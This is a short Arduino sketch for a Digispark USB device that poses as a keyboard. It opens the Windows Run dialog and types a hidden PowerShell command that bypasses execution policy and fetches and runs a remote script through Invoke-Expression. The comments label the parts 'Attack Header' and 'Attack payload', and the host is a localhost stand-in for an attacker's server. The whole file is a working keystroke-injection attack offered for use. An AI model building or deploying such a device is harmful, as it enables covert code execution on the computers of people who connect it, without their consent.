#include "DigiKeyboard.h"

// Attack Header
#define HEADER "PowerShell -w hid -ep bypass \"&{"

// Attack payload
// Note that this payload, along with header and tailer, should not be exceeding 260 characters. The lesser the better.
#define PAYLOAD "IEX $(IWR 127.0.0.1).Content"

#define TAILER "}\""

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  // Sending the compose key: Win+R.
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // Delay a little bit, make sure the Run window is correctly started.
  DigiKeyboard.delay(150);
  // Run!
  DigiKeyboard.println(HEADER PAYLOAD TAILER);
}

void loop() {
  // Telling the computer that I'm still alive
  while (1)
    DigiKeyboard.update();
}
